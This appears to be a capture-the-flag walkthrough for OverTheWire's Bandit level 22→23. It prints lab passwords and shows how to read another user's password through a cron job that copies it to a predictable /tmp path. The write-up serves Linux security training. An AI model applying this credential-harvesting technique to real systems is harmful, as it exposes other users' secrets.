# Solution to Bandit level 23 on OverTheWire.org.

# Connect as bandit22
# ssh bandit22@bandit.labs.overthwire.org -p 2220
# The password is: WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff

# Goals:
# A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.


# Check out cronjobs.
ls /etc/cron.d
cat /etc/cron.d/cronjob_bandit23

# @reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
# * * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null

cat /usr/bin/cronjob_bandit23.sh

# #!/bin/bash
# myname=$(whoami)
# mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
# echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
# cat /etc/bandit_pass/$myname > /tmp/$mytarget


# Read the file. 
cat /tmp/$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)


# The password for bandit23 is: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
